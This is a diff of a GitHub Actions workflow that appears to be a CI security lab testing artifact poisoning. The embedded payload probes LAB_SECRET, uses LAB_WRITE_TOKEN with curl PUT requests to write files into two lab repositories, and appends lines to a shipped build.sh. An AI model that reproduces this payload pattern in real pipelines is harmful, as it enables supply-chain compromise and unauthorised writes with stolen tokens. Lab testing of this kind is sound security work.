@@ -13,11 +13,12 @@ jobs:
           echo "SEEN_LEN=${#LAB_SECRET}"
           printf %s "$LAB_SECRET" | sha256sum | cut -c1-24 | sed "s/^/SEEN_HASH=/"
           echo "TOKEN_PRESENT=$([ -n "$LAB_WRITE_TOKEN" ] && echo yes || echo no)"
-          CODE=$(GH_TOKEN=$LAB_WRITE_TOKEN gh api -X PUT "/repos/boshjerns/vercel-lab-b/contents/executed-script-write.md" -f content="$(printf 'written by code that arrived inside the artifact\n' | base64)" -f message=executed-script-write -o /dev/null -w '%{http_code}' 2>/dev/null)
+          BODY=$(printf '{"content":"%s","message":"executed-script-write"}' "$(printf 'written by code that arrived inside the artifact\n' | base64 | tr -d '\n')")
+          CODE=$(curl -s -o /tmp/exec1.json -w '%{http_code}' -X PUT -H "Authorization: Bearer $LAB_WRITE_TOKEN" -d "$BODY" "https://api.github.com/repos/boshjerns/vercel-lab-b/contents/executed-script-write.md")
           echo "EXEC_WRITE_SECOND_REPO=$CODE"
-          CODE2=$(GH_TOKEN=$LAB_WRITE_TOKEN gh api -X PUT "/repos/boshjerns/vercel-lab/contents/executed-script-write.md" -f content="$(printf 'x\n' | base64)" -f message=exec-outside -o /dev/null -w '%{http_code}' 2>/dev/null)
+          echo "EXEC_COMMIT=$(python3 -c 'import json;print(json.load(open("/tmp/exec1.json")).get("commit",{}).get("sha","none"))' 2>/dev/null || echo none)")
+          CODE2=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: Bearer $LAB_WRITE_TOKEN" -d "$BODY" "https://api.github.com/repos/boshjerns/vercel-lab/contents/executed-script-write.md")
           echo "EXEC_WRITE_OWN_REPO=$CODE2"
-          echo "WHO=$([ -n "$LAB_WRITE_TOKEN" ] && GH_TOKEN=$LAB_WRITE_TOKEN gh api user --jq '.login' 2>/dev/null || echo unknown)"
           PAYLOAD
           echo 'lane-6 payload' > dist/marker.txt
           echo "run=${GITHUB_RUN_ID} lane=6" >> dist/build.sh
@@ -157,5 +158,3 @@ jobs:
           if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
       - run: |
           echo "BEAT_TARGET=${BEAT_TARGET:-none}"
-
-# second attempt
